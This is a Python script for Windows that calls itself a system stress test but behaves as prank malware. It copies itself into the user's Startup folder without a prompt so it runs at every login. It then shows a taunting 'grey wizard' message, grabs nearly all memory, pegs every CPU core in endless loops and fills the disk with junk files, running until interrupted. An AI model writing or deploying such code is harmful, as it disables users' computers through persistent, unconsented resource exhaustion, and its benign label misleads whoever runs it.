import os
import shutil
import subprocess
import tempfile
from pathlib import Path
import psutil
import numpy as np
import multiprocessing
import time
import sys

# ------------------ Disk Fill Function ------------------ #
def fill_disk_until_limit(directory, limit_gb_free=10):
    os.makedirs(directory, exist_ok=True)
    limit_bytes = limit_gb_free * 1024 ** 3
    file_index = 0
    chunk_size = 100 * 1024 * 1024  # 100 MB

    stat = shutil.disk_usage(directory)
    while stat.free > limit_bytes + chunk_size:
        file_path = os.path.join(directory, f"filler_{file_index}.bin")
        with open(file_path, "wb") as f:
            f.write(b'\0' * chunk_size)
        file_index += 1
        stat = shutil.disk_usage(directory)
        print(f"Disk written: {file_index * chunk_size / (1024**3):.2f} GB")

    print("Disk fill complete. Remaining free space:", stat.free / (1024**3), "GB")

# ------------------ Gandalf Message ------------------ #
def show_gandalf_message():
    message = "The grey wizard is in your computer. YOU SHALL NOT PASS!"
    temp_dir = tempfile.gettempdir()
    msg_file = os.path.join(temp_dir, "gandalf_message.txt")
    with open(msg_file, "w") as f:
        f.write(message)
    subprocess.Popen(["notepad.exe", msg_file])

# ------------------ Memory Allocation ------------------ #
def allocate_memory():
    total_memory = psutil.virtual_memory().total
    allocate_bytes = total_memory - (1 * 1024 * 1024 * 1024)  # leave 1 GB
    try:
        _ = np.zeros(int(allocate_bytes / 8))  # float64 = 8 bytes
        print("Memory allocation successful.")
    except MemoryError:
        print("Memory allocation failed.")

# ------------------ CPU Stress ------------------ #
def cpu_stress():
    while True:
        pass

def start_cpu_stress():
    cores = multiprocessing.cpu_count()
    print(f"Stressing {cores} CPU cores...")
    processes = []
    for _ in range(cores):
        p = multiprocessing.Process(target=cpu_stress)
        p.start()
        processes.append(p)
    return processes

# ------------------ Add to Startup ------------------ #
def add_to_startup():
    script_path = Path(sys.argv[0]).resolve()
    startup_folder = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    startup_folder.mkdir(parents=True, exist_ok=True)
    destination = startup_folder / script_path.name

    if not destination.exists():
        shutil.copy2(script_path, destination)
        print(f"Script copied to Startup: {destination}")
    else:
        print("Script already in Startup.")

# ------------------ Main ------------------ #
if __name__ == '__main__':
    print("Starting system stress test in 3 seconds...")
    time.sleep(3)

    # Automatically add to Startup (no prompt)
    try:
        add_to_startup()
    except Exception as e:
        print("Failed to add to Startup:", e)

    # Show Gandalf message
    show_gandalf_message()

    # Allocate memory
    allocate_memory()

    # Start CPU stress
    cpu_processes = start_cpu_stress()

    # Fill disk
    try:
        fill_disk_until_limit(directory="stress_test_temp", limit_gb_free=10)
    except Exception as e:
        print("Disk fill failed:", e)

    # Keep running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping stress test...")
        for p in cpu_processes:
            p.terminate()

